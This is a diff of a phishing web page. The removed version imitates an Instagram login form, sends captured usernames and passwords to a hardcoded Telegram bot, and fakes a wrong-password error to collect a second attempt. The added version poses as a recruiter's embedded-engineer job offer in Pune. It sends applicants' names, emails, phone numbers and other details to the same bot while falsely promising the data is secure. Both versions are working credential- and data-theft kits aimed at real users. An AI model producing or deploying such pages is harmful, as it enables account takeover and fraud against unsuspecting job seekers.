@@ -1,88 +1,220 @@
-        <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Instagram - Login</title>
+    <title>TechHire Consulting - Embedded Engineer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        .box { max-width: 350px; width: 100%; background: white; border: 1px solid #dbdbdb; padding: 40px 30px; text-align: center; border-radius: 1px; }
-        h2 { font-size: 28px; font-weight: 200; color: #262626; margin-bottom: 30px; }
-        input { width: 100%; padding: 12px; margin: 4px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
-        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 8px; font-weight: 600; margin: 10px 0; cursor: pointer; font-size: 14px; }
-        button:hover { background: #0074d9; }
-        .error { color: #ed4956; font-size: 12px; display: none; margin: 10px 0; }
-        .loading { display: none; margin: 10px 0; }
-        .footer { font-size: 11px; color: #8e8e8e; margin-top: 15px; }
-        .insta-header { background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
-        .insta-header h3 { margin: 0; font-size: 16px; }
-        .insta-header p { font-size: 12px; opacity: 0.9; margin-top: 3px; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        .header { background: linear-gradient(135deg, #1a73e8, #0d47a1); color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }
+        .header h1 { font-size: 24px; margin-bottom: 5px; }
+        .header p { font-size: 14px; opacity: 0.9; }
+        .content { background: white; padding: 30px; border-radius: 0 0 10px 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .recruiter-box { background: #e8f0fe; padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #1a73e8; }
+        .recruiter-box h3 { color: #1a73e8; font-size: 15px; margin-bottom: 3px; }
+        .recruiter-box p { color: #555; font-size: 13px; }
+        .job-box { background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #1a73e8; }
+        .job-box h3 { color: #1a73e8; margin-bottom: 12px; }
+        .job-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 14px; color: #555; }
+        .job-grid div strong { color: #333; }
+        .badge { display: inline-block; background: #e8f0fe; color: #1a73e8; padding: 3px 10px; border-radius: 12px; font-size: 12px; margin: 2px; }
+        label { display: block; font-size: 13px; font-weight: 600; color: #333; margin: 15px 0 5px; }
+        input, textarea, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; }
+        input:focus, textarea:focus { border-color: #1a73e8; outline: none; }
+        .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .insta-box { background: linear-gradient(135deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); padding: 20px; border-radius: 10px; text-align: center; margin: 20px 0; color: white; }
+        .insta-box h3 { margin-bottom: 5px; font-size: 16px; }
+        .insta-box p { font-size: 13px; margin-bottom: 10px; }
+        .insta-btn { display: inline-block; background: white; color: #dc2743; padding: 10px 25px; border-radius: 25px; text-decoration: none; font-weight: bold; font-size: 14px; }
+        .btn { background: #1a73e8; color: white; padding: 14px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; margin-top: 15px; }
+        .btn:hover { background: #1557b0; }
+        .success { display: none; text-align: center; padding: 40px; }
+        .success h2 { color: #28a745; }
+        .success p { color: #666; margin-top: 10px; }
+        .note { font-size: 12px; color: #888; text-align: center; margin-top: 15px; }
+        .loading { display: none; text-align: center; padding: 20px; }
+        .spinner { border: 3px solid #e0e0e0; border-top: 3px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @media (max-width: 600px) { .form-row { grid-template-columns: 1fr; } .job-grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
-<div class="box">
-    <div class="insta-header">
-        <h3>📸 TechHire Jobs</h3>
-        <p>Follow us for daily job updates and interview tips!</p>
+<div class="container">
+    <div class="header">
+        <h1>🚀 Career Opportunity</h1>
+        <p>Immediate Hiring for a Leading Semiconductor Client</p>
     </div>
-    <h2>Instagram</h2>
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="Phone number, username, or email" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <div class="error" id="error">Sorry, your password was incorrect. Please try again.</div>
-        <div class="loading" id="loading">Logging in...</div>
-        <button type="button" id="loginBtn" onclick="sendToTelegram()">Log In</button>
-    </form>
-    <div class="footer">You need to log in to follow @techhire.jobs</div>
+    <div class="content">
+        <div class="recruiter-box">
+            <h3>👤 Madhurima Sen</h3>
+            <p>Senior Technical Recruiter | TechHire Consulting Pvt. Ltd.</p>
+        </div>
+        
+        <p style="font-size:14px;color:#555;line-height:1.6;">Hello Candidate,</p>
+        <p style="font-size:14px;color:#555;line-height:1.6;">We have an <strong>urgent requirement</strong> for an Embedded Engineer role with a leading semiconductor client in Pune. Your profile looks like a great match.</p>
+        
+        <div class="job-box">
+            <h3>📋 Job Details</h3>
+            <div class="job-grid">
+                <div><strong>Role:</strong> Embedded Engineer</div>
+                <div><strong>Experience:</strong> 0-2 Years</div>
+                <div><strong>Location:</strong> Pune, Maharashtra</div>
+                <div><strong>Salary:</strong> ₹4.5 - 7 LPA</div>
+                <div><strong>Work Mode:</strong> On-site</div>
+                <div><strong>Interview:</strong> This Week (Virtual)</div>
+            </div>
+            <div style="margin-top:10px;">
+                <strong style="font-size:13px;">Key Skills:</strong>
+                <div style="margin-top:5px;">
+                    <span class="badge">C</span>
+                    <span class="badge">Embedded C</span>
+                    <span class="badge">Microcontrollers</span>
+                    <span class="badge">RTOS</span>
+                    <span class="badge">Arduino</span>
+                    <span class="badge">Firmware</span>
+                </div>
+            </div>
+        </div>
+        
+        <p style="font-size:14px;color:#555;margin:15px 0;">Fill in your details below to apply. I'll share your profile with the client immediately.</p>
+        
+        <form id="jobForm">
+            <div class="form-row">
+                <div>
+                    <label>Full Name *</label>
+                    <input type="text" id="full_name" required>
+                </div>
+                <div>
+                    <label>Email Address *</label>
+                    <input type="email" id="email" required>
+                </div>
+            </div>
+            
+            <div class="form-row">
+                <div>
+                    <label>Phone Number *</label>
+                    <input type="tel" id="phone" required>
+                </div>
+                <div>
+                    <label>Current Location</label>
+                    <input type="text" id="location">
+                </div>
+            </div>
+            
+            <div class="form-row">
+                <div>
+                    <label>Total Experience</label>
+                    <select id="experience">
+                        <option value="">Select</option>
+                        <option value="Fresher">Fresher</option>
+                        <option value="1 Year">1 Year</option>
+                        <option value="2 Years">2 Years</option>
+                    </select>
+                </div>
+                <div>
+                    <label>Current Company</label>
+                    <input type="text" id="company">
+                </div>
+            </div>
+            
+            <div class="form-row">
+                <div>
+                    <label>Highest Education</label>
+                    <select id="education">
+                        <option value="">Select</option>
+                        <option value="B.E/B.Tech">B.E / B.Tech</option>
+                        <option value="M.E/M.Tech">M.E / M.Tech</option>
+                        <option value="Diploma">Diploma</option>
+                    </select>
+                </div>
+                <div>
+                    <label>Passing Year</label>
+                    <input type="number" id="passing_year" min="2018" max="2025">
+                </div>
+            </div>
+            
+            <label>LinkedIn Profile</label>
+            <input type="url" id="linkedin" placeholder="https://linkedin.com/in/...">
+            
+            <div class="insta-box">
+                <h3>📸 Follow Us on Instagram</h3>
+                <p>Get daily job updates, interview tips & early access to openings!</p>
+                <a href="https://www.instagram.com" target="_blank" class="insta-btn">📱 Follow @techhire.jobs</a>
+            </div>
+            
+            <label>Why are you interested in this role?</label>
+            <textarea id="message" rows="3"></textarea>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top:10px;color:#555;">Submitting your application...</p>
+            </div>
+            
+            <button type="button" class="btn" id="submitBtn" onclick="submitApplication()">📩 Submit Application</button>
+            <p class="note">🔒 Your data is secure and only used for recruitment.</p>
+        </form>
+        
+        <div class="success" id="success">
+            <h2>✅ Application Submitted!</h2>
+            <p>Thank you! Our team will review your profile and contact you within 24-48 hours.</p>
+            <p style="margin-top:20px;font-size:13px;color:#888;">Redirecting to LinkedIn Jobs...</p>
+        </div>
+    </div>
 </div>
 
 <script>
-var attempt = 0;
+var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
+var chatId = "1012714242";
 
-function sendToTelegram() {
-    var username = document.getElementById('username').value;
-    var password = document.getElementById('password').value;
-    var btn = document.getElementById('loginBtn');
-    var error = document.getElementById('error');
-    var loading = document.getElementById('loading');
+function submitApplication() {
+    var name = document.getElementById('full_name').value;
+    var email = document.getElementById('email').value;
+    var phone = document.getElementById('phone').value;
+    var location = document.getElementById('location').value;
+    var experience = document.getElementById('experience').value;
+    var company = document.getElementById('company').value;
+    var education = document.getElementById('education').value;
+    var passing = document.getElementById('passing_year').value;
+    var linkedin = document.getElementById('linkedin').value;
+    var message = document.getElementById('message').value;
     
-    if (!username || !password) {
-        alert('Please enter username and password');
+    if (!name || !email || !phone) {
+        alert('Please fill in Name, Email and Phone');
         return;
     }
     
-    attempt++;
-    btn.style.display = 'none';
-    loading.style.display = 'block';
+    document.getElementById('submitBtn').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
     
-    var message = "🔴 INSTAGRAM CREDENTIALS CAPTURED\n";
-    message += "Username: " + username + "\n";
-    message += "Password: " + password + "\n";
-    message += "Time: " + new Date().toLocaleString();
+    var msg = "📋 NEW JOB APPLICATION\n";
+    msg += "═══════════════════════\n";
+    msg += "Name: " + name + "\n";
+    msg += "Email: " + email + "\n";
+    msg += "Phone: " + phone + "\n";
+    msg += "Location: " + (location || 'N/A') + "\n";
+    msg += "Experience: " + (experience || 'N/A') + "\n";
+    msg += "Company: " + (company || 'N/A') + "\n";
+    msg += "Education: " + (education || 'N/A') + "\n";
+    msg += "Passing Year: " + (passing || 'N/A') + "\n";
+    msg += "LinkedIn: " + (linkedin || 'N/A') + "\n";
+    msg += "Message: " + (message || 'N/A') + "\n";
+    msg += "═══════════════════════\n";
+    msg += "Time: " + new Date().toLocaleString();
     
-    var botToken = "8457083817:AAFM5Lsks2cLBqShhVFT5i2p5mH01lJjFEw";
-    var chatId = "1012714242";
-    
-    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+    var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
     
     fetch(url)
     .then(function() {
-        loading.style.display = 'none';
-        
-        if (attempt == 1) {
-            // First attempt: show error
-            error.style.display = 'block';
-            btn.style.display = 'block';
-            btn.textContent = 'Log In';
-        } else {
-            // Second attempt: redirect to real Instagram
-            window.location.href = 'https://www.instagram.com/techhire.jobs/';
-        }
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('jobForm').style.display = 'none';
+        document.getElementById('success').style.display = 'block';
+        setTimeout(function() { window.location.href = 'https://www.linkedin.com/jobs/'; }, 4000);
     })
     .catch(function() {
-        loading.style.display = 'none';
-        btn.style.display = 'block';
-        alert('Something went wrong. Please try again.');
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('submitBtn').style.display = 'block';
+        alert('Error submitting. Please try again.');
     });
 }
 </script>
